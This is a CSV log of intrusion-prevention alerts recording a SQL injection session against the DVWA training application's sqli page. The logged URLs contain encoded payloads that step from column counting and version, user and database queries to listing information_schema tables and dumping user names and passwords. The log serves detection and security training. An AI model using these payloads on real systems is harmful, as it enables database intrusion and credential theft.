attackid,sessionid,repeated,severity,attack,service,srcip,dstip,srcport,dstport,subtype,eventtype,url
15621,634513,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,59882,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+order+by+3%23&Submit=Submit
15621,634514,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,59884,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+order+by+3+%23&Submit=Submit
15621,634515,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,59887,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+order+by+2+%23&Submit=Submit
15621,634517,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,59895,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+order+by+3+%23&Submit=Submit
15621,634518,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,59897,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+order+by+2+%23&Submit=Submit
15621,634520,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,59901,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+1%2C2+%23&Submit=Submit
15621,634521,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,59904,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+1%2Cversion%28%29+%23&Submit=Submit
15621,634522,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,59907,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=ID%3A+3+%27+and+1%3D1+union+select+null%2Cuser%28%29&Submit=Submit
15621,634522,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,59907,80,ips,signature,
15621,634523,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,59912,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=ID%3A+ID%3A+3+%27+and+1%3D1+union+select+null%2Cdatabase%28%29+%23&Submit=Submit
15621,634524,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,59917,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2Cdatabase%28%29+%23&Submit=Submit
15621,634525,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,59922,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2C+table_name+from+information_schema.tables&Submit=Submit
15621,634526,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,59923,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2C+table_name+from+information_schema.tables+%23&Submit=Submit
15621,634527,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,59936,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2C+table_name+from+information_schema.columns+where+table_name%3D%27users%27+%23&Submit=Submit
15621,634528,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,59957,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit
15621,634536,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,65534,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+order+by+3+%23&Submit=Submit
15621,634537,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49152,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+order+by+3+%23&Submit=Submit
15621,634537,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49152,80,ips,signature,
15621,634538,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49156,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+1%2C2+%23&Submit=Submit
15621,634539,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49158,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+1%2Cversion%28%29+%23&Submit=Submit
